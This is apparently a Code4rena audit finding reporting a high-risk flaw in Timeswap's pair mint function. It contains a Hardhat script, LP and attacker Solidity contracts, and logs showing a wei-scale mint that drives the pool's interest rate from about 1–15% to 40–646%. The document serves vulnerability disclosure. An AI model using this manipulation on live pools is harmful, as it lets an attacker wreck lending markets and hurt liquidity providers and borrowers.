## Tags

- bug
- 3 (High Risk)
- sponsor confirmed

# [Manipulation of the Y State Results in Interest Rate Manipulation](https://github.com/code-423n4/2022-01-timeswap-findings/issues/187) 

# Handle

Rhynorater


# Vulnerability details

## Impact
Due to lack of constraints on user input in the `TimeswapPair.sol#mint` function, an attacker can arbitrarily modify the interest rate while only paying a minimal amount of Asset Token and Collateral Token. 

Disclosure: This is my first time attempting Ethereum hacking, so I might have made some mistakes here since the math is quite complex, but I'm going to give it a go. 

## Proof of Concept
The attack scenario is this: A malicious actor is able to hyper-inflate the interest rate on a pool by triggering a malicious mint function. The malicious actor does this to attack the LP and other members of the pool. 

Consider the following HardHat script:
```
const hre = require("hardhat");


//jtok is asset
//usdc is collat

async function launchTestTokens(tokenDeployer){
    //Launch a token
    const TestToken = await ethers.getContractFactory("TestToken", signer=tokenDeployer);
    const tt = await TestToken.deploy("JTOK", "JTOK", 1000000000000000)
    const tt2 = await TestToken.deploy("USDC", "USDC", 1000000000000000)
    let res = await tt.balanceOf(tokenDeployer.address)
    let res2 = await tt.balanceOf(tokenDeployer.address)
    console.log("JTOK balance: "+res)
    console.log("USDC balance: "+res2)
    return [tt, tt2]
}

async function deployAttackersContract(attacker, jtok, usdc){
    const Att = await ethers.getContractFactory("Attacker", signer=attacker)
    const atakcontrak = await Att.deploy(jtok.address, usdc.address)
    return atakcontrak
}

async function deployLPContract(lp, jtok, usdc){
    const LP = await ethers.getContractFactory("LP", signer=lp)
    const lpc = await LP.deploy(jtok.address, usdc.address)
    return lpc
}

async function main() {
    const [tokenDeployer, lp, attacker] = await ethers.getSigners();
    let balance = await tokenDeployer.getBalance()
    let factory = await ethers.getContractAt("TimeswapFactory", "0x5FbDB2315678afecb367f032d93F642f64180aa3", signer=tokenDeployer)
    //let [jtok, usdc] = await launchTestTokens(tokenDeployer)
    let jtok = await ethers.getContractAt("TestToken", "0x2279b7a0a67db372996a5fab50d91eaa73d2ebe6", signer=tokenDeployer)
    let usdc = await ethers.getContractAt("TestToken", "0x8a791620dd6260079bf849dc5567adc3f2fdc318", signer=tokenDeployer)
    console.log("Jtok: "+jtok.address)
    console.log("USDC: "+usdc.address)

    //Create Pair
    //let txn = await factory.createPair(jtok.address, usdc.address)
    pairAddress = await factory.getPair(jtok.address, usdc.address)
    pair = await ethers.getContractAt("TimeswapPair", pairAddress, signer=tokenDeployer)
    console.log("Pair address: "+pairAddress);

    // Deploy LP
    //let lpc = await deployLPContract(lp, jtok, usdc)
    let lpc = await ethers.getContractAt("LP", "0x948b3c65b89df0b4894abe91e6d02fe579834f8f", signer=lp)


    let jtokb = await jtok.balanceOf(lpc.address)
    let usdcb = await usdc.balanceOf(lpc.address)
    console.log("LP Jtok: "+jtokb)
    console.log("LP USDC: "+usdcb)

    //let txn2 = await lpc.timeswapMint(1641859791, 15, pairAddress)
    let res = await pair.constantProduct(1641859791);
    console.log("Post LP Constants:", res);

    let atakcontrak = await deployAttackersContract(attacker, jtok, usdc)

    jtokb = await jtok.balanceOf(atakcontrak.address)
    usdcb = await usdc.balanceOf(atakcontrak.address)
    console.log("Attacker Jtok: "+jtokb)
    console.log("Attacker USDC: "+usdcb)

    //mint some tokens
    let txn2 = await atakcontrak.timeswapMint(1641859791, 15, pairAddress)

    let res2 = await pair.constantProduct(1641859791);
    console.log("Post Attack Constants:", res2);

}
main().then(()=>process.exit(0))

```

First, the LP deploys their pool and contributes their desired amount of tokens with the below contract:
```
pragma solidity =0.8.4;

import "hardhat/console.sol";
import {ITimeswapMintCallback} from "./interfaces/callback/ITimeswapMintCallback.sol";
import {IPair} from "./interfaces/IPair.sol";
import {IERC20} from '@openzeppelin/contracts/token/ERC20/IERC20.sol';
interface TestTokenLP is IERC20{
    function mmint(uint256 amount) external;
}

contract LP is ITimeswapMintCallback {

    uint112 constant SEC_PER_YEAR = 31556926;
    TestTokenLP internal jtok;
    TestTokenLP internal usdc;

constructor(address _jtok, address _usdc){
    jtok = TestTokenLP(_jtok);
    jtok.mmint(10_000 ether);
    usdc = TestTokenLP(_usdc);
    usdc.mmint(10_000 ether);
}

function timeswapMint(uint maturity, uint112 APR, address pairAddress) public{
    uint256 maturity = maturity;
    console.log("Maturity: ", maturity);
    address liquidityTo = address(this);
    address dueTo = address(this);
    uint112 xIncrease = 5_000 ether;
    uint112 yIncrease = (APR*xIncrease)/(SEC_PER_YEAR*100);
    uint112 zIncrease = (5*xIncrease)/3; //Static 167% CDP
    IPair(pairAddress).mint(maturity, liquidityTo, dueTo, xIncrease, yIncrease, zIncrease, "");
}


function timeswapMintCallback(
        uint112 assetIn,
        uint112 collateralIn,
        bytes calldata data
    ) override external{
        jtok.mmint(100_000 ether);
        usdc.mmint(100_000 ether);
        console.log("Asset requested:", assetIn);
        console.log("Collateral requested:", collateralIn);
        //check before
        uint256 beforeJtok = jtok.balanceOf(msg.sender);
        console.log("LP jtok before", beforeJtok);
        //transfer
        jtok.transfer(msg.sender, assetIn);
        //check after
        uint256 afterJtok = jtok.balanceOf(msg.sender);
        console.log("LP jtok after", afterJtok);
        //check before
        uint256 beforeUsdc = usdc.balanceOf(msg.sender);
        console.log("LP USDC  before", beforeUsdc);
        //transfer
        usdc.transfer(msg.sender, collateralIn);
        //check after
        uint256 afterUsdc = usdc.balanceOf(msg.sender);
        console.log("LP USDC After", afterUsdc);
        
    }
}

```
Here are the initialization values:
```
    uint112 xIncrease = 5_000 ether;
    uint112 yIncrease = (APR*xIncrease)/(SEC_PER_YEAR*100);
    uint112 zIncrease = (5*xIncrease)/3; //Static 167% CDP
```
With this configuration, I've calculated the interest rate to borrow on this pool using the functions defined here: https://timeswap.gitbook.io/timeswap/deep-dive/borrowing
to  be:
```
yMax: 4.7533146923118e-06
Min Interest Rate: 0.009374999999999765
Max Interest Rate: 0.14999999999999625
zMax: 1666.6666666666667

```
Around 1% to 15%. 

Then, the attacker comes along (see line containing `let atakcontrak` and after). The attacker deploys the following contract:
```
pragma solidity =0.8.4;

import "hardhat/console.sol";
import {ITimeswapMintCallback} from "./interfaces/callback/ITimeswapMintCallback.sol";
import {IPair} from "./interfaces/IPair.sol";
import {IERC20} from '@openzeppelin/contracts/token/ERC20/IERC20.sol';
interface TestTokenAtt is IERC20{
    function mmint(uint256 amount) external;
}

contract Attacker is ITimeswapMintCallback {

    uint112 constant SEC_PER_YEAR = 31556926;
    TestTokenAtt internal jtok;
    TestTokenAtt internal usdc;

constructor(address _jtok, address _usdc){
    jtok = TestTokenAtt(_jtok);
    jtok.mmint(10_000 ether);
    usdc = TestTokenAtt(_usdc);
    usdc.mmint(10_000 ether);
}

function timeswapMint(uint maturity, uint112 APR, address pairAddress) public{
    uint256 maturity = maturity;
    console.log("Maturity: ", maturity);
    address liquidityTo = address(this);
    address dueTo = address(this);
    uint112 xIncrease = 3;
    uint112 yIncrease = 1000000000000000;
    uint112 zIncrease = 5; //Static 167% CDP
    IPair(pairAddress).mint(maturity, liquidityTo, dueTo, xIncrease, yIncrease, zIncrease, "");
}


function timeswapMintCallback(
        uint112 assetIn,
        uint112 collateralIn,
        bytes calldata data
    ) override external{
        jtok.mmint(100_000 ether);
        usdc.mmint(100_000 ether);
        console.log("Asset requested:", assetIn);
        console.log("Collateral requested:", collateralIn);
        //check before
        uint256 beforeJtok = jtok.balanceOf(msg.sender);
        console.log("Attacker jtok before", beforeJtok);
        //transfer
        jtok.transfer(msg.sender, assetIn);
        //check after
        uint256 afterJtok = jtok.balanceOf(msg.sender);
        console.log("Attacker jtok after", afterJtok);
        //check before
        uint256 beforeUsdc = usdc.balanceOf(msg.sender);
        console.log("Attacker USDC  before", beforeUsdc);
        //transfer
        usdc.transfer(msg.sender, collateralIn);
        //check after
        uint256 afterUsdc = usdc.balanceOf(msg.sender);
        console.log("Attacker USDC After", afterUsdc);
        
    }
}
```

Which contains the following settings for a mint:
```
    uint112 xIncrease = 3;
    uint112 yIncrease = 1000000000000000;
    uint112 zIncrease = 5; //Static 167% CDP
```

According to my logs in hardhat:
```
    Maturity:  1641859791
    Callback before: 8333825816710789998373
    Asset requested: 3
    Collateral requested: 6
    Attacker jtok before 5000000000000000000000
    Attacker jtok after 5000000000000000000003
    Attacker USDC  before 8333825816710789998373
    Attacker USDC After 8333825816710789998379
    Callback after: 8333825816710789998379
    Callback expected after: 8333825816710789998379

```
The attacker is only required to pay 3 wei of Asset Token and 6 wei of Collateral token. However, after the attacker's malicious mint is up, the interest rate becomes:
```
yMax: 0.0002047533146923118
Min Interest Rate: 0.40383657499999975
Max Interest Rate: 6.461385199999996
zMax: 1666.6666666666667
```
Between 40 and 646 percent.


xyz values before and after:
```
Post LP Constants: [ BigNumber { value: "5000000000000000000000" },
  BigNumber { value: "23766573461559" },
  BigNumber { value: "8333333333333333333333" },
  x: BigNumber { value: "5000000000000000000000" },
  y: BigNumber { value: "23766573461559" },
  z: BigNumber { value: "8333333333333333333333" } ]
Attacker Jtok: 10000000000000000000000
Attacker USDC: 10000000000000000000000
Post Attack Constants: [ BigNumber { value: "5000000000000000000003" },
  BigNumber { value: "1023766573461559" },
  BigNumber { value: "8333333333333333333338" },
  x: BigNumber { value: "5000000000000000000003" },
  y: BigNumber { value: "1023766573461559" },
  z: BigNumber { value: "8333333333333333333338" } ]

```

This result in destruction of the pool. 

